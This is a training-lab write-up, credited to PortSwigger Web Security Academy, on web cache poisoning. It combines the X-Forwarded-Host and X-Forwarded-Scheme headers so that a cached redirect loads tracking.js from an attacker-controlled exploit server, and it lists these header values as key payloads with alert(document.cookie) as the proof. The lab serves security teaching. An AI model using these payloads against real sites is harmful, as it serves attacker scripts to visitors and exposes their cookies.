## Web cache poisoning with multiple headers

**Category:** cache_poisoning
**Difficulty:** Medium

### Description
This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

### Solution Steps
1. Analyze the homepage and how JavaScript resources are loaded
2. Find /resources/js/tracking.js is loaded dynamically
3. Test X-Forwarded-Host header alone - no effect
4. Test X-Forwarded-Scheme header alone - no effect
5. Try both headers together - they interact!
6. X-Forwarded-Scheme: nothttps (or http) triggers a redirect
7. X-Forwarded-Host controls the redirect destination
8. The redirect Location header uses both values:
9. `X-Forwarded-Host: exploit-server.com` + `X-Forwarded-Scheme: http`
10. Response: `Location: https://exploit-server.com/...`
11. Set up exploit server with /resources/js/tracking.js containing alert(document.cookie)
12. Poison the cache by sending both headers:
13. `X-Forwarded-Host: YOUR-EXPLOIT-SERVER` + `X-Forwarded-Scheme: nothttps`
14. Victim loads cached page, gets redirect to your server
15. Victim's browser loads malicious tracking.js, executes alert(document.cookie)

### Key Payloads
- `alert(document.cookie)`
- `X-Forwarded-Host`
- `X-Forwarded-Scheme`
- `X-Forwarded-Host: YOUR-EXPLOIT-SERVER`
- `X-Forwarded-Scheme: nothttps`
- `/resources/js/tracking.js`
- `Location` header

### Indicators of Success
- Neither header alone causes exploitable behavior
- Both headers combined trigger redirect
- Location header points to attacker server
- Cache stores redirecting response
- Victim executes malicious JavaScript

---
*Source: PortSwigger Web Security Academy*
